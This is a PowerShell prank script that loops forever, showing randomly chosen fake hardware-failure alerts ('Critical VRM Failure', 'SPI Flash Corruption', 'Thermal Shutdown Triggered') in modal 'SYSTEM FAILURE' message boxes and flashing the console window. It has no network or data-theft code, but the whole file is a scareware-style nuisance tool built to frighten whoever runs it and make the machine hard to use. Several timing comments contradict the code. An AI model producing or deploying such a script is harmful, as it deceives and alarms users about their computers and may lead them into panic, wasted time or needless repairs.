# Wait 10 seconds before starting (suspense)
Start-Sleep -Seconds 5

# Function to show fake system failure popups
function Show-FakeError {
    $messages = @(
    "BIOS Integrity Check Failed: Corrupt firmware detected. Reflashing required.",
    "Voltage Irregularity: Sudden power loss detected on PCIe lanes.",
    "Critical VRM Failure: Voltage regulation unstable, component damage imminent.",
    "DIMM Slot Error: Unrecoverable memory read failures in Bank 0xA3.",
    "Liquid Contamination Warning: High impedance detected in motherboard traces.",
    "Southbridge Bus Failure: Cannot establish communication with PCI Express controller.",
    "Fatal I/O Error: Device descriptor request failed on Root Hub 0x01.",
    "Thermal Throttle Override: CPU temperature exceeding 100°C, immediate shutdown advised.",
    "System Clock Desynchronization: CMOS checksum error, RTC failure detected.",
    "EEPROM Corruption: Embedded controller firmware mismatch with expected checksum.",
    "RAM Address Mapping Failure: Memory controller returning inconsistent parity checks.",
    "Boot Sector Unstable: SSD/HDD read latency exceeding manufacturer limits.",
    "Power Surge Event: Overcurrent protection engaged on 12V rail.",
    "Super I/O Controller Fault: Fan RPM reporting inconsistent with expected range.",
    "EEPROM Write Protection Failure: Unable to commit changes to firmware storage.",
    "PCIe Lane Degradation: Signal attenuation detected on Lane 0x04.",
    "SATA Controller Timeouts: Drives unable to negotiate link speed.",
    "Kernel DMA Protection Bypass: Unauthorized memory access attempts detected.",
    "System Bus Contention: Multiple devices reporting resource conflicts.",
    "Hardware Interrupt Storm: Excessive IRQ activity detected from onboard peripherals.",
    "Faulty Sensor Data: Embedded thermal diode reporting negative temperatures.",
    "Memory Refresh Rate Mismatch: Unstable RAM timings detected.",
    "Security Violation: Unauthorized modification of UEFI boot variables detected.",
    "DPC Watchdog Violation: Deferred procedure calls exceeding acceptable latency threshold.",
    "LPC Bus Failure: Low Pin Count controller reporting invalid address ranges.",
    "EC Sensor Read Error: Embedded controller returning inconsistent voltage levels.",
    "SPI Flash Corruption: BIOS firmware integrity verification failed.",
    "PCI Express Fatal Error: Transaction Layer Packet (TLP) corruption detected.",
    "DRAM ECC Failure: Multiple bit errors detected, system memory integrity compromised.",
    "Northbridge Communication Loss: System cannot synchronize cache coherency protocol.",
    "Power Fault Detected: Voltage fluctuations exceeding ATX specification tolerances.",
    "Unexpected Kernel Panic: Stack trace references unknown memory address.",
    "Watchdog Timer Expired: System stability compromised, forced reboot pending.",
    "Bus Contention Detected: Conflicting address space allocations in chipset firmware.",
    "Thunderbolt Controller Timeout: Unable to establish PCIe tunneling.",
    "FATAL: Floating Point Unit Exception: Arithmetic operation exceeded valid range.",
    "DDR4 SPD Read Error: Serial Presence Detect EEPROM failing checksum validation.",
    "Embedded TPM Failure: Trusted Platform Module firmware reporting inconsistent PCR registers.",
    "USB Controller Malfunction: Root hub unable to negotiate connection speed.",
    "Onboard Audio Codec Failure: No response from I2C interface.",
    "System Firmware Corruption: ACPI tables modified outside of expected bounds.",
    "Southbridge I/O Hub Failure: SATA and USB controllers reporting non-responsive state.",
    "Unstable PCI Express Link: Excessive retries observed on handshake initialization.",
    "Power Management Unit Overload: CPU Package Power exceeded recommended maximum wattage.",
    "Firmware Rollback Protection Bypassed: Unauthorized firmware detected.",
    "Secure Boot Policy Violation: Unauthorized kernel-mode driver execution attempt detected.",
    "FATAL: CPU L2 Cache Parity Error: Data corruption detected in Level 2 cache hierarchy.",
    "BIOS ROM Checksum Mismatch: Integrity verification failed, emergency recovery required.",
    "Warning: Memory Controller Failing Calibration, Latency Instability Detected.",
    "POST Diagnostic Code 0xA4: Non-Maskable Interrupt (NMI) Assertion from Southbridge.",
    "Liquid Contamination Alert: High Resistance Detected on PCB Traces, Failure Imminent.",
    "EC Firmware Panic: System Management Interrupt (SMI) storm detected.",
    "Intel ME Firmware Corruption: Management Engine unable to verify integrity.",
    "Critical: PCIe Downstream Port Training Failure, Root Complex Unable to Establish Link.",
    "System Halted: Hardware Watchdog Timer Expiration, No Response from Embedded Controller.",
    "EEPROM Write Disturbance Detected: Flash Wear-Leveling Controller Reporting Overuse.",
    "Non-Correctable Memory Errors Logged: System May Be Unstable, Replacement Advised.",
    "FATAL: Unable to Enumerate PCI Devices, System Bus Collision Detected.",
    "Failure in Dynamic Power Management: VRM Unable to Regulate Load Transients.",
    "Thermal Shutdown Triggered: CPU Die Temperature Exceeds 105°C, Power Cut Initiated.",
    "CMOS Battery Low: RTC Date and Time Reset to Defaults, BIOS Configuration Lost.",
    "Failure in Address Translation: MMU Reporting Illegal Page Access.",
    "Bus Arbitration Failure: Multiple Masters Detected on I2C Bus.",
    "Embedded Controller Lockup: No Response to Host Interface Commands.",
    "Hardware Exception 0xDEAD: CPU Pipeline Stalled, Instruction Fetch Invalid.",
    "Persistent DRAM Errors Logged: High Probability of Memory Chip Degradation.",
    "Unexpected NMI Watchdog Alert: High System Interrupt Latency Detected.",
    "Hardware Timer Malfunction: System Tick Timer Drifting Outside Expected Range.",
    "EEPROM Wear Leveling Threshold Exceeded: BIOS Flash Expected to Fail Soon."
)

    $message = $messages | Get-Random

    # Check if WinAPI is already defined before adding
    if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class WinAPI {
            [DllImport("user32.dll")]
            public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
        }
"@ -Language CSharp
    }

    [WinAPI]::MessageBox([IntPtr]::Zero, $message, "SYSTEM FAILURE", 0x10)
}

# Function for screen glitch (flashing window effect)
function Screen-Glitch {
    # Check if FlashWindowEx API is already defined
    if (-not ([System.Management.Automation.PSTypeName]'WinAPI_Flash').Type) {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class WinAPI_Flash {
            [DllImport("user32.dll")]
            public static extern bool FlashWindowEx(ref FLASHWINFO pwfi);
            public struct FLASHWINFO {
                public uint cbSize;
                public IntPtr hwnd;
                public uint dwFlags;
                public uint uCount;
                public uint dwTimeout;
            }
        }
"@ -Language CSharp
    }

    $flInfo = New-Object WinAPI_Flash+FLASHWINFO
    $flInfo.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($flInfo)
    $flInfo.hwnd = (Get-Process -Id $PID).MainWindowHandle
    $flInfo.dwFlags = 3
    $flInfo.uCount = 10
    $flInfo.dwTimeout = 0
    [WinAPI_Flash]::FlashWindowEx([ref]$flInfo)
}

# Start looping after an initial delay of 40 seconds
Start-Sleep -Seconds 2

while ($true) {
    Start-Sleep -Seconds (Get-Random -Minimum 0.1 -Maximum 1.5)  # Random interval (20-60s)
    $randomEffect = Get-Random -InputObject @(
        "Show-FakeError",
        "Screen-Glitch"
    )
    Invoke-Expression $randomEffect
}
